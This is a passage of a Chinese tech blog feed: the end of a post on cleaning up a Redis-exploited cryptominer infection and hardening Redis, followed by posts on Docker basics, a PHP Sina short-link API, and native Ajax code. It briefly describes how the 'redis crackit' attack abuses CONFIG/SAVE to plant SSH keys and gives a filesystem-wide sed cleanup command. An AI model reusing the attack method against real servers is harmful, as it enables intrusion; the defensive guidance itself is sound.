&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 恢复服务器中的js文件(其中grep的参数为小写的L)
方法一：删除站点所有感染 js 文件，从代码仓库pull，重新上传部署。
方法二：# find / -name '*.js' | xargs grep -l f4ce9 | xargs sed -i '/f4ce9/d'

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga77f413&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga77f413&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 预防&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 限制内网访问，或者只限制本机访问
只监听内网的IP，然后在iptables里面限制访问的主机：在/etc/redis/redis.conf中配置如下：
bind 192.168.1.100
如果服务只需要本机访问就直接监听127.0.0.1的回环地址就可以了。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 设置防火墙
如果需要其他机器访问，或者设置了slave模式，那就记得加上相应的防火墙设置，命令如下：
iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
3. 禁止root用户启动redis
使用root权限去运行网络服务是比较有风险的（nginx和apache都是有独立的work用户，而redis没有）。
edis crackit 漏洞就是利用root用户的权限来替换或者增加authorized_keys，来获取root登录权限的。
使用root切换到redis用户启动服务:
useradd -s /sbin/nolog -M redissetsid sudo -u redis /usr/bin/redis-server /etc/redis/redis.conf

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
4. 限制redis文件目录访问权限
设置redis的主目录权限为700,如果redis配置文件独立于redis主目录,权限修过为600,因为redis密码明文存储在配置文件中。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
5. 避免使用熟知的端口,降低被初级扫描的风险
在/etc/redis/redis.conf中配置如下：
找到port 6379这行，把6379改为9999，记得iptables对应的端口要修改

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
6. 开启redis密码认证,并设置高复杂度密码
redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。
redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。 

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
7. 禁用或者重命名危险命令
edis crackit漏洞就利用config/save两个命令完成攻击 。 因redis无用户权限限制，建议危险的命令，
使用rename配置项进行禁用或重命名，这样外部不了解重命名规则攻击者，就不能执行这类命令。涉及到的命令：
FLUSHDB, FLUSHALL, KEYS, PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME, DEBUG, EVAL`
以下示例：redis.config文件禁用FLUSHDB、FLUSHALL两个命令；重命名CONFIG、SHUTDOWN命令，添加一个特殊的后缀。
这样redis启动后，只能运行CONFIG_b9fc8327c4dee7命令，不能执行CONFIG命令。
rename-command CONFIG CONFIG_des327c4dee7dfsf
rename-command SHUTDOWN SHUTDOWN_des327c4dee7dfsf
rename-command FLUSHDB &quot;&quot;
rename-command FLUSHALL &quot;&quot;
上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，
我们自己却容易记住的的名字。保存之后，执行/etc/init.d/redis-server restart 重启生效。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org58c0bed&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org58c0bed&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 参考&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/Rebybyx/p/9913779.html&quot;&gt;XMR恶意挖矿脚本处理笔记&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/186743.html&quot;&gt;XMR恶意挖矿案例简析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.xzeu.com/index.php/archives/120/&quot;&gt;Redis未授权访问缺陷,服务器变矿机&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="比特币" /><category term="恶意挖矿" /><category term="病毒" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">Docker notes</title><link href="http://localhost:4000/%E8%99%9A%E6%8B%9F%E5%8C%96/2018/12/12/docker/" rel="alternate" type="text/html" title="Docker notes" /><published>2018-12-12T00:00:00+08:00</published><updated>2018-12-12T00:00:00+08:00</updated><id>http://localhost:4000/%E8%99%9A%E6%8B%9F%E5%8C%96/2018/12/12/docker</id><content type="html" xml:base="http://localhost:4000/%E8%99%9A%E6%8B%9F%E5%8C%96/2018/12/12/docker/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org20ab02e&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org20ab02e&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; Docker 简介&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb661c18&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb661c18&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; Docker 是什么&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的维护效率，降低了云计算应用开发的成本！使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，节约有限的生命。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8f8c6dc&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org8f8c6dc&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 为什么要用 Docker&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;更高效的利用系统资源&lt;/li&gt;
&lt;li&gt;更快速的启动时间&lt;/li&gt;
&lt;li&gt;一致的运行环境&lt;/li&gt;
&lt;li&gt;持续交付和部署&lt;/li&gt;
&lt;li&gt;更轻松的迁移&lt;/li&gt;
&lt;li&gt;更轻松的维护和扩展&lt;/li&gt;
&lt;li&gt;对比传统虚拟机总结&lt;/li&gt;
&lt;/ul&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;特性&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;容器&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;虚拟机&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;启动&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;秒级&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;分钟级&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;硬盘使用&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般为 MB&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般为 GB&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;性能&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;接近原生&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;弱于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;系统支持量&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;单机支持上千个容器&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般几十个&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org26dea4c&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org26dea4c&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 基本概念&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org85027a6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org85027a6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 镜像&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. Docker 镜像

&lt;/pre&gt;
&lt;p&gt;
Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:18.04 就包含了完整的一套 Ubuntu 18.04 最小系统的 root 文件系统。
Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 分层存储

&lt;/pre&gt;
&lt;p&gt;
Docker 利用了 &lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt; 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。
镜像构建时，会一层层构建，前一层是后一层的基础。在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd0883f4&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd0883f4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 容器&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;p&gt;
容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。
容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。
每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9f8cac4&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9f8cac4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 仓库&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. Docker Registry

&lt;/pre&gt;
&lt;p&gt;
&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/repository/registry.html&quot;&gt;Docker Registry&lt;/a&gt; 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
2. Docker Registry 公开服务

&lt;/pre&gt;
&lt;p&gt;
开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。
最常使用的 Registry 公开服务
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;官方的 &lt;a href=&quot;https://hub.docker.com/&quot;&gt;Docker Hub&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://coreos.com/&quot;&gt;CoreOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://quay.io/repository/&quot;&gt;Quay.io&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;时速云镜像仓库&lt;/li&gt;
&lt;li&gt;网易云镜像服务&lt;/li&gt;
&lt;li&gt;DaoCloud 镜像市场&lt;/li&gt;
&lt;li&gt;阿里云镜像库&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;example&quot;&gt;
由于某些原因，在国内访问这些服务可能会比较慢。国内的一些云服务商提供了针对 Docker Hub 的镜像服务（Registry Mirror），这些镜像服务被称为加速器。常见的有：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://cr.console.aliyun.com/#/accelerator&quot;&gt;阿里云加速器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.daocloud.io/mirror#accelerator-doc&quot;&gt;DaoCloud 加速器&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org6267165&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org6267165&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.1&lt;/span&gt; &lt;/h4&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org56e34e6&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org56e34e6&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 安装 Docker&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Ubuntu：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Debian：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/debian.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/debian.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;CentOS：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/centos.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/centos.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Raspberry Pi：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/raspberry-pi.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/raspberry-pi.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org25a509e&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org25a509e&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/&quot;&gt;Docker — 从入门到实践&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="docker" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">PHP 调用新浪API生成短链接</title><link href="http://localhost:4000/php/2018/09/19/php-sina-short-url/" rel="alternate" type="text/html" title="PHP 调用新浪API生成短链接" /><published>2018-09-19T00:00:00+08:00</published><updated>2018-09-19T00:00:00+08:00</updated><id>http://localhost:4000/php/2018/09/19/php-sina-short-url</id><content type="html" xml:base="http://localhost:4000/php/2018/09/19/php-sina-short-url/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org7b46439&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org7b46439&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; API&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;http://api.t.sina.com.cn/short_url/shorten.json&quot;&gt;http://api.t.sina.com.cn/short_url/shorten.json&lt;/a&gt; (返回结果是JSON格式)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://api.t.sina.com.cn/short_url/shorten.xml&quot;&gt;http://api.t.sina.com.cn/short_url/shorten.xml&lt;/a&gt; （返回结果是XML格式）&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9b321c8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9b321c8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 请求参数&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;source 申请应用时分配的AppKey，调用接口时代表应用的唯一身份。&lt;/li&gt;
&lt;li&gt;url_long 需要转换的长链接，需要URLencoded，最多不超过20个。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org10d2018&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org10d2018&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 创建source方法&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;进入&lt;a href=&quot;http://open.weibo.com/&quot;&gt;http://open.weibo.com/&lt;/a&gt; ，选择菜单 微连接-&amp;gt;网站接入。&lt;/li&gt;
&lt;li&gt;点击立即接入，创建新应用，随便填写应用名称，点击创建。&lt;/li&gt;
&lt;li&gt;创建成功后，AppKey就是source参数的值，可以用于请求创建短链接。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf49adf7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf49adf7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 测试代码&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;测试代码&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;&amp;lt;?php
$api = 'http://api.t.sina.com.cn/short_url/shorten.json'&lt;span style=&quot;color: #b22222;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;// json&lt;/span&gt;
// $api = 'http://api.t.sina.com.cn/short_url/shorten.xml'&lt;span style=&quot;color: #b22222;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;// xml&lt;/span&gt;

$source = '&amp;#24744;&amp;#30003;&amp;#35831;&amp;#30340;AppKey'&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
$url_long = 'http://blog.csdn.net/fdipzone'&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;

$request_url = sprintf($api.'?source=%s&amp;amp;url_long=%s', $source, $url_long)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;

$data = file_get_contents($request_url)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
echo $data&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2495c78&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2495c78&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/fdipzone/article/details/70832761&quot;&gt;php 调用新浪API生成短链接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="PHP-新浪-短链接" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">Ajax</title><link href="http://localhost:4000/javascript/2018/09/17/ajax/" rel="alternate" type="text/html" title="Ajax" /><published>2018-09-17T00:00:00+08:00</published><updated>2018-09-17T00:00:00+08:00</updated><id>http://localhost:4000/javascript/2018/09/17/ajax</id><content type="html" xml:base="http://localhost:4000/javascript/2018/09/17/ajax/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-orge60be4d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orge60be4d&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; AJAX 简介&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
全称：Asynchronous Javascript and XML，由 Javascript+CSS+DOM+XMLHttpRequest+XSTL+XHTML+XML 七种技术组成，其中技术核心是 XMLHttpRequest。

&lt;/pre&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge709a28&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge709a28&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 同步和异步&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
同步：发送方发出数据后，等接收方发回响应以后才发下一个数据包的通讯方式。
异步：发送方发出数据后，不等接收方发回响应，接着发送下个数据包的通讯方式。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org900aab2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org900aab2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; XMLHttpRequest&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;Ajax 原生代码示例&lt;/label&gt;&lt;pre class=&quot;src src-javascript&quot;&gt;&lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;ajax&lt;/span&gt; = {
        &lt;span style=&quot;color: #0000ff;&quot;&gt;get&lt;/span&gt;:&lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;url&lt;/span&gt;,&lt;span style=&quot;color: #a0522d;&quot;&gt;func&lt;/span&gt;){
        &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;XMLHttpRequest &amp;#29992;&amp;#20110;&amp;#22312;&amp;#21518;&amp;#21488;&amp;#19982;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#20132;&amp;#25442;&amp;#25968;&amp;#25454;   &lt;/span&gt;
        &lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;xhr&lt;/span&gt; = &lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;XMLHttpRequest&lt;/span&gt;();
        xhr.open(&lt;span style=&quot;color: #8b2252;&quot;&gt;'GET'&lt;/span&gt;, url, &lt;span style=&quot;color: #008b8b;&quot;&gt;true&lt;/span&gt;);
        xhr.onreadystatechange = &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;() {
        &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;readyState == 4 &amp;#35828;&amp;#26126;&amp;#35831;&amp;#27714;&amp;#24050;&amp;#23436;&amp;#25104;&lt;/span&gt;
        &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt; (xhr.readyState == 4 &amp;amp;&amp;amp; xhr.status == 200 || xhr.status == 304) { 
                &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#20174;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#33719;&amp;#24471;&amp;#25968;&amp;#25454;&lt;/span&gt;
              fn.call(&lt;span style=&quot;color: #008b8b;&quot;&gt;this&lt;/span&gt;, xhr.responseText);  
        }
    };
    xhr.send();
  },
  &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;data &amp;#24212;&amp;#20026; 'a=a1&amp;amp;b=b1' &amp;#36825;&amp;#31181;&amp;#23383;&amp;#31526;&amp;#20018;&amp;#26684;&amp;#24335;&amp;#65292;&amp;#22312; jquery &amp;#37324;&amp;#22914;&amp;#26524; data &amp;#20026;&amp;#23545;&amp;#35937;&amp;#20250;&amp;#33258;&amp;#21160;&amp;#23558;&amp;#23545;&amp;#35937;&amp;#36716;&amp;#25104;&amp;#36825;&amp;#31181;&amp;#23383;&amp;#31526;&amp;#20018;&amp;#26684;&amp;#24335;&lt;/span&gt;
  &lt;span style=&quot;color: #0000ff;&quot;&gt;post&lt;/span&gt;: &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt; (&lt;span style=&quot;color: #a0522d;&quot;&gt;url&lt;/span&gt;, &lt;span style=&quot;color: #a0522d;&quot;&gt;data&lt;/span&gt;, &lt;span style=&quot;color: #a0522d;&quot;&gt;fn&lt;/span&gt;) {
    &lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;xhr&lt;/span&gt; = &lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;XMLHttpRequest&lt;/span&gt;();
    xhr.open(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;POST&quot;&lt;/span&gt;, url, &lt;span style=&quot;color: #008b8b;&quot;&gt;true&lt;/span&gt;);
    &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#28155;&amp;#21152; http &amp;#22836;&amp;#65292;&amp;#21457;&amp;#36865;&amp;#20449;&amp;#24687;&amp;#33267;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#26102;&amp;#20869;&amp;#23481;&amp;#32534;&amp;#30721;&amp;#31867;&amp;#22411;&lt;/span&gt;
    xhr.setRequestHeader(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;, &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;);  
    xhr.onreadystatechange = &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;() {
      &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt; (xhr.readyState == 4 &amp;amp;&amp;amp; (xhr.status == 200 || xhr.status == 304)) {
        fn.call(&lt;span style=&quot;color: #008b8b;&quot;&gt;this&lt;/span&gt;, xhr.responseText);
      }
    };
    xhr.send(data);
  }
};
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org71d9007&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org71d9007&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; jQuery Ajax&lt;/h2&gt;
